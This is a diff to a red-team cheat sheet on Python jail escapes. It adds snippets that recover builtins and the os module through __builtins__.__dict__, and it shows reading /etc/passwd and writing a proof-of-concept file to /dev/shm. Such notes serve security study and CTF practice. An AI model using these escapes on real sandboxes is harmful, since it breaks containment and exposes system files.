@@ -85,6 +85,8 @@ $ bind -f /etc/passwd
 
 ## Python Jails
 
+*Additional reference: [python payloads](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/payloads.md#python).*
+
 <div class="row row-cols-lg-2"><div>
 
 #### Python Jails Enumeration
@@ -98,10 +100,10 @@ vars()        # without any argument, same as 'locals'
 ```
 
 ```py
-__builtins__.__dict__
 del __builtins__  # restore them
-__builtins__.__dict__['open']
-__builtins__.__dict__['__import']('os')
+__builtins__.__dict__ # or __builtins__ if deleted
+open = __builtins__.__dict__['open']
+os = __builtins__.__dict__['__import__']('os')
 ```
 
 #### Python File Write
@@ -117,8 +119,12 @@ print("im"+"port os\nprint(os.getcwd())", file=open("/dev/shm/poc.py", "w"))
 
 #### Python File Read
 
+You can arbitrarily read files using:
+
 ```py
 file=open("/etc/passwd", "r"); print(''.join(file.readlines()))
+```
+```py
 help('print') # :e/path/to/file
 ```
 </div><div>
